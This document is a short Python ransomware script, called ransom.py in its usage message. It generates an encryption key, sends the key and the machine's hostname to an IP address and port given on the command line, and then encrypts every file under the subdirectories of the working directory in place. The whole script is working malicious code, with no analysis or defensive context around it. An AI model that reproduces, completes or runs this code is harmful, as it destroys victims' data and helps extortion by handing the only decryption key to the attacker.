import socket
import sys
from pathlib import Path
from cryptography.fernet import Fernet
import os

# Note: Install cryptography library using pip if you haven't already:
# pip install cryptography

def generate_key():
    key = Fernet.generate_key()
    return key

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_directory(directory_path, key):
    for item in Path(directory_path).rglob('*'):
        if item.is_file():
            encrypt_file(item, key)


def main():
    if len(sys.argv) < 3:
        print("Usage: python ransom.py <IP_ADDRESS> <PORT>")
        sys.exit(1)

    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])
    hostname = socket.gethostname()

    key = generate_key()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP_ADDRESS, PORT))
    sock.sendto(f"{hostname}|{key}".encode(), (IP_ADDRESS, PORT))
    sock.close()

    root = Path.cwd()
    print("Encrypting files in the following directories:")
    for subdir in root.iterdir():
        if subdir.is_dir():
            print(f"{subdir} ")
            encrypt_directory(subdir, key)

if __name__ == "__main__":
    main()